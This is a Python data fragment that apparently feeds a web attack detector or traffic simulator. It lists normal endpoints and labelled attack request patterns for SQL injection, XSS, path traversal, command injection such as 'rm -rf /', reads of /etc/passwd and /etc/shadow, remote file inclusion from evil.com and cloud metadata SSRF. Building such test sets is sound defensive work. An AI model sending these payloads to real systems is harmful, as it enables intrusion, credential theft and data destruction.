NORMAL_ENDPOINTS = [
    "/", "/home", "/about", "/contact", "/login", "/logout", "/register", "/profile",
    "/settings", "/search", "/products", "/services", "/blog", "/news", "/faq",
    "/api/v1/users", "/api/v1/posts", "/api/v1/comments", "/api/v1/auth/login",
    "/api/v1/auth/logout", "/admin", "/admin/employees"
]

# Generalized Attack Patterns
ATTACK_PATTERNS = [
    # SQL Injection
    ("/?id=1 OR 1=1", "GET"),
    ("/?id=1; DROP TABLE users;", "GET"),
    ("/search?q='; UNION SELECT username,password FROM users--", "GET"),

    # XSS
    ("/search?q=<script>alert('XSS')</script>", "GET"),
    ("/?name=<img src=x onerror=alert('XSS')>", "GET"),
    ("/comment?text=<svg/onload=alert('XSS')>", "POST"),

    # Path Traversal
    ("/../../etc/passwd", "GET"),
    ("/..%2F..%2F..%2F..%2Fetc%2Fpasswd", "GET"),
    ("/file?name=../../../etc/shadow", "GET"),

    # Remote Code Execution
    ("/?exec=ls -la", "GET"),
    ("/api/execute?cmd=whoami", "GET"),
    ("/run?code=import os; os.system('id')", "GET"),

    # Command Injection
    ("/ping?host=google.com; rm -rf /", "GET"),
    ("/process?data=user1 | cat /etc/passwd", "POST"),

    # Local File Inclusion
    ("/page?file=../../../../etc/passwd", "GET"),
    ("/include?module=../../../../../../proc/self/environ", "GET"),

    # Remote File Inclusion
    ("/plugin?load=http://evil.com/malicious.php", "GET"),

    # SSRF
    ("/proxy?url=http://internal-service/admin", "GET"),
    ("/fetch?data=http://169.254.169.254/latest/meta-data/", "GET"),

    # XML External Entity (XXE)
    ("/api/parse", "POST"),

    # Deserialization
    ("/api/deserialize", "POST"),

    # Open Redirect
    ("/redirect?url=https://evil.com", "GET"),

    # CSRF
    ("/transfer?to=attacker&amount=1000", "GET"),

    # Buffer Overflow simulation
    ("/" + "A" * 10000, "GET"),

    # Format String
    ("/print?format=%x%x%x%x", "GET"),

    # LDAP Injection
    ("/search?user=*)(uid=*)", "GET"),

    # Template Injection
    ("/page?template={{7*7}}", "GET"),

    # GraphQL abuse
    ("/graphql?query={__schema{types{name}}}", "GET"),

    # JWT abuse
    ("/api/protected", "GET"),

    # NoSQL Injection
    ('/api/users?query={"$gt":""}', "GET"),

    # Miscellaneous
    ("/", "TRACE"),
    ("/upload", "POST"),
    ("/login", "POST"),
    ("/api/data", "POST"),
    ("/api/parse", "POST")
]